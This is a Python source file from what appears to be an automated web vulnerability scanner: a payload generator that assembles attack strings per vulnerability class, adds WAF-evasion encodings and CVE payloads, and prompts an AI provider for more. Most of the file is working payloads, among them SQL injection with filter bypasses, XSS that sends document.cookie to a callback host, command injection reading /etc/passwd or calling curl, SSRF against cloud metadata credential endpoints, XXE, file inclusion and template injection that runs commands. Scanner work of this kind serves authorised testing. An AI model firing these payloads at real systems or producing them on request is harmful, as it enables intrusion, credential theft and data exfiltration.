"""
AI Payload Generator
Generates intelligent, context-aware payloads using AI providers
"""

from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs
from functools import lru_cache
import hashlib
from pathlib import Path
from utils.logger import get_logger

logger = get_logger(__name__)


class AIPayloadGenerator:
    """Generate intelligent security testing payloads using AI."""

    # Placeholder domain for out-of-band (OOB) callback payloads.
    # Users MUST replace this with their own OAST server (e.g., Burp Collaborator,
    # interact.sh, or a self-hosted callback listener) before running scans.
    # Using a domain you don't control risks leaking target data to third parties.
    OAST_CALLBACK_URL = ""

    def __init__(self, ai_manager, config: Dict):
        self.ai_manager = ai_manager
        self.config = config
        self.payload_config = config.get('vulnerability_scanner', {}).get('payload_generation', {})
        self.payload_cache = {}
        self.use_context_aware = self.payload_config.get('context_aware', True)
        self.use_cve_database = self.payload_config.get('cve_database', True)
        self.cve_matcher = None

        scanner_cfg = config.get('scanner', {})
        oast_cfg = config.get('oast', {})
        callback = (
            scanner_cfg.get('oast_callback_url')
            or oast_cfg.get('callback_url')
            or ''
        ).strip()
        self.OAST_CALLBACK_URL = callback

        if self.use_cve_database:
            try:
                from modules.cve_intelligence.cve_matcher import get_cve_matcher
                self.cve_matcher = get_cve_matcher(config, auto_seed=True)
                if self.cve_matcher:
                    logger.info("CVE matcher initialized for payload enrichment")
                else:
                    logger.info(
                        "CVE database not found/empty — run: python scripts/update_cve_database.py"
                    )
            except Exception as e:
                logger.debug(f"CVE matcher initialization failed: {e}")
        
    def generate_payloads(self, context: Dict) -> Dict[str, List[str]]:
        """
        Generate intelligent payloads based on context.
        
        Args:
            context: Dictionary containing URL, response, headers, etc.
            
        Returns:
            Dictionary mapping vulnerability types to payload lists
        """
        # Check cache first
        context_hash = self._hash_context(context)
        if context_hash in self.payload_cache:
            logger.debug("Using cached payloads")
            return self.payload_cache[context_hash]
        
        if not self.payload_config.get('use_ai', True):
            return self._get_default_payloads()
        
        payloads = {}
        
        try:
            tech_stack = self._detect_technology_stack(context)
            waf_info = self._waf_profile(context)
            waf_detected = waf_info.get("waf", "none") not in (None, "", "none")
            waf_prof = waf_info.get("payload_profile") or {}
            context = dict(context)
            context["waf_profile"] = waf_info
            logger.debug(f"Tech stack: {tech_stack}, WAF: {waf_info.get('waf')}")

            payloads['sql_injection'] = self._generate_sql_payloads(context, tech_stack, waf_detected)
            payloads['xss'] = self._generate_xss_payloads(context, tech_stack, waf_detected)
            payloads['command_injection'] = self._generate_command_injection_payloads(context)
            payloads['ssrf'] = self._generate_ssrf_payloads(context)
            payloads['xxe'] = self._generate_xxe_payloads(context)
            payloads['path_traversal'] = self._generate_path_traversal_payloads(context)
            payloads['lfi'] = self._generate_lfi_payloads(context)
            payloads['ssti'] = self._generate_ssti_payloads(context, tech_stack)
            payloads['ldap_injection'] = self._generate_ldap_payloads(context)
            payloads['crlf_injection'] = self._generate_crlf_payloads(context)
            payloads['open_redirect'] = self._generate_open_redirect_payloads(context)
            payloads['nosql_injection'] = self._generate_nosql_payloads(context)
            payloads['rfi'] = self._generate_rfi_payloads(context)

            if waf_detected and waf_prof:
                for k in ("sql_injection", "xss", "command_injection", "ssti", "lfi"):
                    if payloads.get(k):
                        payloads[k] = self._apply_waf_profile(payloads[k], waf_prof)[:25]

            if self.payload_config.get('use_ai', True) and self.ai_manager:
                ai_extra = self._ai_enrich_payloads(context, tech_stack, waf_detected)
                for k, extra in ai_extra.items():
                    if extra:
                        base = payloads.get(k) or []
                        payloads[k] = list(dict.fromkeys(extra + base))[:25]

            # Enrich with CVE-based payloads if available
            if self.cve_matcher and tech_stack:
                cve_matches = self.cve_matcher.match_technology_cves(tech_stack)
                cve_payloads = self.cve_matcher.get_payloads_from_cves(cve_matches)
                
                # Merge CVE payloads with generated ones (CVE payloads first - higher priority)
                for attack_type, cve_payload_list in cve_payloads.items():
                    if attack_type in payloads and cve_payload_list:
                        # Prepend CVE payloads (they are more targeted)
                        payloads[attack_type] = cve_payload_list[:5] + payloads[attack_type]
                        logger.info(f"Added {len(cve_payload_list[:5])} CVE-based {attack_type} payloads")
            
            # Cache the generated payloads
            self.payload_cache[context_hash] = payloads
            
        except Exception as e:
            logger.error(f"Error generating AI payloads: {e}")
            payloads = self._get_default_payloads()
        
        return payloads
    
    def _hash_context(self, context: Dict) -> str:
        """Generate hash for context caching."""
        key = f"{context.get('url', '')}_{context.get('headers', {}).get('server', '')}"
        return hashlib.md5(key.encode()).hexdigest()
    
    def _detect_technology_stack(self, context: Dict) -> List[str]:
        """Detect technology stack from response."""
        tech = []
        headers = context.get('headers', {})
        response = context.get('response')
        
        # Check headers
        server = headers.get('server', '').lower()
        if 'apache' in server:
            tech.append('apache')
        if 'nginx' in server:
            tech.append('nginx')
        if 'iis' in server:
            tech.append('iis')
        
        powered_by = headers.get('x-powered-by', '').lower()
        if 'php' in powered_by:
            tech.append('php')
        if 'asp.net' in powered_by:
            tech.append('aspnet')
        
        # Check response content
        if response and hasattr(response, 'text'):
            content = response.text.lower()
            if 'wp-content' in content or 'wordpress' in content:
                tech.append('wordpress')
            if 'joomla' in content:
                tech.append('joomla')
            if 'django' in content:
                tech.append('django')
            if 'laravel' in content:
                tech.append('laravel')
            if 'express' in content or 'node' in headers.get('x-powered-by', '').lower():
                tech.append('nodejs')
        
        return tech
    
    def _detect_waf(self, context: Dict) -> bool:
        return bool(self._waf_profile(context).get("waf") not in (None, "", "none"))

    def _waf_profile(self, context: Dict) -> Dict:
        if context.get("waf_profile") and isinstance(context["waf_profile"], dict):
            return context["waf_profile"]
        try:
            from modules.waf_fingerprint.detector import WAFFingerprint
            info = WAFFingerprint(None, self.config).detect(
                context.get("url") or "",
                context.get("response"),
            )
            return info or {}
        except Exception:
            pass
        headers = context.get("headers") or {}
        blob = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
        for name, sigs in (
            ("cloudflare", ("cf-ray", "cloudflare")),
            ("akamai", ("akamai", "ak_bmsc")),
            ("aws_waf", ("awselb", "x-amzn-requestid")),
            ("sucuri", ("x-sucuri", "sucuri")),
            ("imperva", ("incapsula", "imperva")),
            ("modsecurity", ("mod_security", "modsecurity")),
        ):
            if any(s in blob for s in sigs):
                return {"waf": name, "payload_profile": {"prefer_encoding": ["url", "case_swap"], "case_swap": True}}
        return {"waf": "none", "payload_profile": {"prefer_encoding": ["plain"]}}

    def _apply_waf_profile(self, payloads: List[str], profile: Dict) -> List[str]:
        if not payloads or not profile:
            return payloads
        prefs = profile.get("prefer_encoding") or []
        out = list(payloads)
        if "case_swap" in prefs or profile.get("case_swap"):
            for p in payloads[:5]:
                if any(c.isalpha() for c in p):
                    out.append("".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)))
        if "url" in prefs or "double_url" in prefs:
            from urllib.parse import quote
            for p in payloads[:4]:
                out.append(quote(p, safe=""))
                if "double_url" in prefs:
                    out.append(quote(quote(p, safe=""), safe=""))
        if "comment_insert" in prefs:
            for p in payloads[:3]:
                if " " in p:
                    out.append(p.replace(" ", "/**/", 1))
        if "unicode" in prefs:
            for p in payloads[:2]:
                if "<" in p:
                    out.append(p.replace("<", "\\u003c").replace(">", "\\u003e"))
        avoid = set(profile.get("avoid") or [])
        if "script_tag_raw" in avoid:
            out = [p for p in out if "<script" not in p.lower()]
        return list(dict.fromkeys(out))
    
    def _generate_sql_payloads(self, context: Dict, tech_stack: List[str] = [], waf_detected: bool = False) -> List[str]:
        """Generate SQL injection payloads optimized for context."""
        db_type = self._detect_database_type(context, tech_stack)
        
        # Base payloads
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
        ]
        
        # Database-specific payloads
        if 'mysql' in db_type.lower():
            payloads.extend([
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(5000000,MD5('test'))--",
                "' AND extractvalue(1,concat(0x7e,database()))--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ])
        elif 'postgresql' in db_type.lower():
            payloads.extend([
                "' AND pg_sleep(5)--",
                "' UNION SELECT NULL::text--",
                "'; SELECT pg_sleep(5)--"
            ])
        elif 'mssql' in db_type.lower():
            payloads.extend([
                "' WAITFOR DELAY '0:0:5'--",
                "' UNION SELECT NULL--",
                "'; WAITFOR DELAY '0:0:5'--"
            ])
        elif 'oracle' in db_type.lower():
            payloads.extend([
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                "' UNION SELECT NULL FROM DUAL--"
            ])
        
        # WAF bypass payloads
        if waf_detected:
            payloads.extend([
                "' /**/OR/**/1=1--",
                "' %0aOR%0a1=1--",
                "' /*!50000OR*/ 1=1--",
                "' UnIoN SeLeCt NULL--",
                "'/**/AND/**/SLEEP(5)--",
                "1'/**/OR/**/'1'='1",
                "'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--",
            ])

        return list(dict.fromkeys(payloads))[:20]

    def _generate_xss_payloads(
        self, context: Dict, tech_stack: List[str] = None, waf_detected: bool = False
    ) -> List[str]:
        """Generate XSS payloads (must not be mixed into SQL corpus)."""
        tech_stack = tech_stack or []
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            f"<script>fetch('{(self.OAST_CALLBACK_URL or 'http://127.0.0.1')}/?c='+document.cookie)</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<svg><script>alert&#40;'XSS')</script>",
            "<img src=\"x\" onerror=\"alert`1`\">",
            "<details open ontoggle=alert(1)>",
            "<svg><animate onbegin=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
            "<marquee onstart=alert(1)>",
            "'\"><img src=x onerror=alert(1)>",
            "<math><mtext></math><img src=x onerror=alert(1)>",
        ]

        headers = context.get('headers') or {}
        content_type = str(headers.get('content-type') or headers.get('Content-Type') or '').lower()
        if 'json' in content_type:
            payloads.extend([
                '{"xss":"<script>alert(1)</script>"}',
                '{"xss":"<img src=x onerror=alert(1)>"}',
            ])

        if waf_detected:
            payloads.extend([
                "<ScRiPt>alert(1)</ScRiPt>",
                "<img src=x onerror=alert`1`>",
                "<svg/onload=alert(String.fromCharCode(88,83,83))>",
                "<iframe src=\"javasc&Tab;ript:alert(1)\">",
                "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
                "<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;1&#41;</script>",
                "<img src onerror=eval(atob('YWxlcnQoMSk='))>",
                "\"><img src=x onerror=alert(1)>",
            ])

        if any(t in tech_stack for t in ('react', 'angular', 'vue', 'nodejs')):
            payloads.extend([
                "{{constructor.constructor('alert(1)')()}}",
                "<div ng-app ng-csp><div ng-click=$event.view.alert(1)>x</div></div>",
            ])

        return list(dict.fromkeys(payloads))[:20]

    def _generate_command_injection_payloads(self, context: Dict) -> List[str]:
        """Generate command injection payloads."""
        return [
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "`ls -la`",
            "$(ls -la)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
            "\n/bin/id\n",
            "| id ||",
            f"$(curl {(self.OAST_CALLBACK_URL or 'http://127.0.0.1')}/cmd)",
            "; powershell -c whoami",
            "& dir",
            "| type %WINDIR%\\win.ini",
        ]

    def _generate_ssrf_payloads(self, context: Dict) -> List[str]:
        """Generate SSRF payloads."""
        return [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "http://[::1]",
            "http://2130706433",
            "http://0x7f000001",
            "http://[::ffff:127.0.0.1]/",
            "http://127.1/",
            "http://0/",
            f"{(self.OAST_CALLBACK_URL or 'http://127.0.0.1')}/ssrf",
            "gopher://127.0.0.1:6379/_INFO",
            "dict://127.0.0.1:11211/stats",
        ]

    def _generate_xxe_payloads(self, context: Dict) -> List[str]:
        """Generate XXE payloads."""
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{(self.OAST_CALLBACK_URL or "http://127.0.0.1")}/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % dtd SYSTEM "http://127.0.0.1/xxe.dtd">%dtd;]><data>&send;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        ]

    def _generate_path_traversal_payloads(self, context: Dict) -> List[str]:
        """Generate path traversal payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..;/..;/..;/etc/passwd",
            "/var/www/../../etc/passwd",
            "....\\/....\\/....\\/etc/passwd",
            "%252e%252e%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "/proc/self/environ",
            "....//....//....//windows/system32/drivers/etc/hosts",
        ]
    
    def _get_ai_response(self, prompt: str) -> List[str]:
        if not self.ai_manager:
            return []
        try:
            response = self.ai_manager.generate(prompt)
            if not response:
                return []
            lines = []
            for line in str(response).splitlines():
                line = line.strip().lstrip("-*").strip()
                if not line or line.startswith("#"):
                    continue
                if line.startswith("```"):
                    continue
                lines.append(line)
            return lines[:10]
        except Exception as e:
            logger.warning(f"Failed to get AI response: {e}")
            return []

    def _ai_enrich_payloads(
        self, context: Dict, tech_stack: List[str], waf_detected: bool
    ) -> Dict[str, List[str]]:
        params = self._extract_parameters(context)
        fields = self._extract_input_fields(context)
        tech = ", ".join(tech_stack) if tech_stack else "unknown"
        waf = "yes" if waf_detected else "no"
        url = context.get("url", "")
        out: Dict[str, List[str]] = {}
        prompts = {
            "sql_injection": (
                f"List 5 short SQL injection payloads for URL {url}. "
                f"Params: {params}. Tech: {tech}. WAF: {waf}. One payload per line, no prose."
            ),
            "xss": (
                f"List 5 short XSS payloads for URL {url}. "
                f"Fields: {fields}. Tech: {tech}. WAF: {waf}. One payload per line, no prose."
            ),
            "ssrf": (
                f"List 5 short SSRF/cloud-metadata payloads for URL {url}. "
                f"Params: {params}. One payload per line, no prose."
            ),
        }
        for attack, prompt in prompts.items():
            try:
                got = self._get_ai_response(prompt)
                if got:
                    out[attack] = got
            except Exception as e:
                logger.debug(f"AI enrich {attack}: {e}")
        return out

    def _generate_ldap_payloads(self, context: Dict) -> List[str]:
        return [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*)(|(password=*))",
            "*)(objectClass=*",
            "\\2a",
            "admin*",
        ]

    def _generate_crlf_payloads(self, context: Dict) -> List[str]:
        return [
            "%0d%0aSet-Cookie:deepeye=1",
            "%0aSet-Cookie:deepeye=1",
            "%0d%0aX-Injected: true",
            "\r\nSet-Cookie: deepeye=1",
            "%0d%0a%0d%0a<script>alert(1)</script>",
            "%E5%98%8A%E5%98%8DSet-Cookie:deepeye=1",
        ]

    def _generate_open_redirect_payloads(self, context: Dict) -> List[str]:
        return [
            "https://evil.example/",
            "//evil.example/",
            "///evil.example/",
            "/\\evil.example/",
            "https:evil.example",
            "////evil.example",
            "https://evil.example%2f%2f.example.com/",
            "javascript:alert(1)",
            f"{(self.OAST_CALLBACK_URL or 'http://127.0.0.1')}/redirect",
        ]

    def _generate_nosql_payloads(self, context: Dict) -> List[str]:
        return [
            '{"$gt":""}',
            '{"$ne":null}',
            '{"$regex":".*"}',
            "true, $where: '1 == 1'",
            "'; return true; var x='",
            "[$ne]=1",
            '{"$or":[{},{"a":"a"}]}',
        ]

    def _generate_rfi_payloads(self, context: Dict) -> List[str]:
        oast = (self.OAST_CALLBACK_URL or "").rstrip("/")
        if oast:
            return [
                f"{oast}/rfi.txt",
                f"{oast}/rfi.php",
                f"//{urlparse(oast).netloc}/rfi.txt" if "://" in oast else f"{oast}/rfi",
            ]
        return [
            "http://127.0.0.1/rfi-probe-deepeye.txt",
            "https://127.0.0.1/rfi-probe-deepeye.php",
            "php://filter/convert.base64-encode/resource=http://127.0.0.1/x",
        ]

    def _extract_parameters(self, context: Dict) -> str:
        """Extract URL parameters from context."""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(context.get('url', ''))
        params = parse_qs(parsed.query)
        return ', '.join(params.keys()) if params else 'None'
    
    def _extract_input_fields(self, context: Dict) -> str:
        """Extract input field names from forms in context."""
        forms = context.get("forms") or []
        names = []
        for form in forms:
            if not isinstance(form, dict):
                continue
            for inp in form.get("inputs") or []:
                if not isinstance(inp, dict):
                    continue
                name = (inp.get("name") or "").strip()
                if name:
                    names.append(name)
        if not names:
            return "None"
        return ", ".join(dict.fromkeys(names))

    def _generate_lfi_payloads(self, context: Dict) -> List[str]:
        """Generate LFI payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "/etc/passwd%00",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "/proc/self/environ",
            "....//....//....//etc/shadow",
            "file:///etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
        ]

    def _generate_ssti_payloads(self, context: Dict, tech_stack: List[str] = None) -> List[str]:
        """Generate SSTI payloads based on technology."""
        tech_stack = tech_stack or []
        payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{7*'7'}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "#set($x=7*7)${x}",
            "*{7*7}",
            "@(7*7)",
        ]

        if any(t in tech_stack for t in ("jinja", "flask", "django", "python")):
            payloads.extend([
                "{{config}}",
                "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            ])
        if "php" in tech_stack or "twig" in tech_stack:
            payloads.extend(["{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "{{7*'7'}}"])
        if any(t in tech_stack for t in ("java", "spring", "jsp")):
            payloads.extend([
                "${T(java.lang.System).getenv()}",
                "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            ])

        return list(dict.fromkeys(payloads))
    
    def _get_default_payloads(self) -> Dict[str, List[str]]:
        return {
            "sql_injection": self._generate_sql_payloads({}),
            "xss": self._generate_xss_payloads({}),
            "command_injection": self._generate_command_injection_payloads({}),
            "ssrf": self._generate_ssrf_payloads({}),
            "xxe": self._generate_xxe_payloads({}),
            "path_traversal": self._generate_path_traversal_payloads({}),
            "lfi": self._generate_lfi_payloads({}),
            "ssti": self._generate_ssti_payloads({}),
            "ldap_injection": self._generate_ldap_payloads({}),
            "crlf_injection": self._generate_crlf_payloads({}),
            "open_redirect": self._generate_open_redirect_payloads({}),
            "nosql_injection": self._generate_nosql_payloads({}),
            "rfi": self._generate_rfi_payloads({}),
        }
    
    def _detect_database_type(self, context: Dict, tech_stack: List[str] = []) -> str:
        """Detect database type from response headers or errors."""
        response = context.get('response')
        
        if response and hasattr(response, 'text'):
            content = response.text.lower()
            
            if 'mysql' in content or 'mysqli' in content:
                return 'MySQL'
            elif 'postgresql' in content or 'pg_' in content:
                return 'PostgreSQL'
            elif 'microsoft sql' in content or 'mssql' in content:
                return 'MSSQL'
            elif 'oracle' in content:
                return 'Oracle'
            elif 'sqlite' in content:
                return 'SQLite'
        
        # Infer from tech stack
        if 'php' in tech_stack:
            return 'MySQL'
        elif 'aspnet' in tech_stack:
            return 'MSSQL'
        elif 'django' in tech_stack or 'nodejs' in tech_stack:
            return 'PostgreSQL'
        
        return "Unknown"

